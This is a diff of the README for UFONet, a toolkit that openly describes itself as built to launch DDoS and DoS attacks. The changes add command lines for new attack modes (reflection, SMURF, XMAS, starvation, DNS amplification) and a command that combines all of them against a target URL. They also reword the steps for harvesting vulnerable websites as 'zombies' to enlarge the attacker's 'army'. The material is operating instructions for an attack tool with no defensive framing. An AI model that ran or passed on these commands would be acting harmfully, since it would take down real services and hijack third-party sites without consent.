@@ -42,7 +42,7 @@ UFONet - is a toolkit designed to launch DDoS and DoS attacks.
 See these links for more info:
 
    - CWE-601:Open Redirect: 
-     http://cwe.mitre.org/data/definitions/601.html
+     https://cwe.mitre.org/data/definitions/601.html
 
    - OWASP:URL Redirector Abuse: 
      https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2
@@ -62,7 +62,7 @@ UFONet runs on many platforms. It requires Python (>2.7.9) and the following lib
 
 You can automatically get all required libraries using:
 
-     python setup.py install
+     sudo python setup.py install
 
 For manual installation on Debian-based systems (ex: Ubuntu), run: 
 
@@ -106,14 +106,16 @@ Or providing a list of "dorks" from a file:
 
        ./ufonet --sd 'botnet/dorks.txt'
 
-By default UFONet will use a search engine called 'Yahoo'. But you can choose a different one:
+By default UFONet will use a search engine called 'StartPage'. But you can choose a different one:
 
        ./ufonet -s 'proxy.php?url=' --se 'bing'
 
 This is the list of available search engines with last time that they were working:
 
-        - bing [26/09/2018: OK!]
-        - yahoo [26/09/2018: OK!]
+        - startpage  [06/03/2019: OK!]
+        - duckduckgo [06/03/2019: OK!]
+        - bing       [06/03/2019: OK!]
+        - yahoo      [06/03/2019: OK!]
 
 You can also search massively using all search engines supported:
 
@@ -130,11 +132,11 @@ Or you can make the tool to search for the maximun number of results automatical
 At the end of the process, you will be asked if you want to check the list retrieved to see 
 if the urls are vulnerable.
 
-       Want to check if they are valid zombies? (Y/n)
+       Do you want to check if the NEW possible zombies are valid? (Y/n)
 
-Also, you will be asked to update the list adding automatically only the 'vulnerable' web apps.
+After that, you will be asked to update the list adding automatically only the 'vulnerable' web apps.
 
-       Want to update your list? (Y/n)
+       Do you want to update your army? (Y/n)
 
 If your answer is 'Y', your new 'zombies' will be appended to the file named: zombies.txt
 
@@ -178,7 +180,11 @@ Finally, you can order your 'zombies' to attack you and see how they reply to yo
 At the end of the process, you will be asked if you want to check the list retrieved to see 
 if the urls are vulnerable.
 
-       Want to check if they are valid zombies? (Y/n)
+       Do you want to check if the NEW possible zombies are valid? (Y/n)
+
+After that, you will be asked to update the list adding automatically only the 'vulnerable' web apps.
+
+       Do you want to update your army? (Y/n)
 
 If your answer is 'Y', the file: "botnet/zombies.txt" will be updated.
 
@@ -343,11 +349,32 @@ And you can connect UFOSYN (it requires 'root' access) to start a powerful TCP/S
 
      sudo python ufonet -a http://target.com --ufosyn 100
 
-Both ways could be combined, so UFONet can attack DDoS and DoS, at the same time:
+Or make a SPRAY ('root' required) attack to launch a Distributed 'Reflection' Denial of Service (DrDoS):
 
-     ./python ufonet -a http://target.com --loic 100 --loris 100
+     sudo python ufonet -a http://target.com --spray 100
 
-     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100
+A SMURF ('root' required) attack to send Distributed ICMP 'Broadcast' packets:
+
+     sudo python ufonet -a http://target.com --smurf 101
+
+Or a XMAS ('root' required) attack that will flood your target with 'Christmas Tree' packets
+
+     sudo python ufonet -a http://target.com --xmas 101
+
+A STARVATION attack ('root' required) that will knock down your target in seconds, if it does not have a 
+minimum level of protection:
+
+     sudo python ufonet -a http://target.com --nuke 10000
+
+Or a TACHYON ('root' required) attack to perform a distributed amplification of DNS traffic:
+
+     sudo python ufonet -a http://target.com --tachyon 1000
+
+All ways could be combined, so UFONet can attack DDoS and DoS, at the same time:
+
+     python ufonet -a http://target.com --loic 100 --loris 100
+
+     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101 --nuke 10000 --tachyon 1000
 
 ###############################
 # Updating
@@ -402,6 +429,7 @@ This will open a tab on your default browser with all features of the tool and s
  - NEWS: Allows to read last "news" published by a "mothership"
  - MISSIONS: Allows to read last "missions" published by a "mothership"
  - SHIP STATS: Allows to review statistics from your "spaceship"
+ - RANKING: Allows to check your "ranking" position
  - BOARD: Allows to send/receive messages to/from a "mothership" (a forum)
  - WARPS: Allows to interact with a "mothership" to download/upload "zombies"
  - GLOBAL GRID: Allows to review statistics from other "spaceships"
@@ -412,6 +440,18 @@ This will open a tab on your default browser with all features of the tool and s
 ###############################
 
 --------------------------
+10.03.2019 : v.1.3
+--------------------------
+
+--------------------------
+03.02.2019 : v.1.2.1
+--------------------------
+
+--------------------------
+31.12.2018 : v.1.2
+--------------------------
+
+--------------------------
 26.09.2018 : v.1.1
 --------------------------
 
@@ -420,19 +460,19 @@ This will open a tab on your default browser with all features of the tool and s
 --------------------------
 
 --------------------------
-14.07.2017 : v.0.9b
+14.07.2017 : v.0.9
 --------------------------
 
 --------------------------
-21.10.2016 : v.0.8b
+21.10.2016 : v.0.8
 --------------------------
 
 --------------------------
-17.08.2016 : v.0.7b
+17.08.2016 : v.0.7
 --------------------------
 
 --------------------------
-05.11.2015 : v.0.6b
+05.11.2015 : v.0.6
 --------------------------
 
 --------------------------
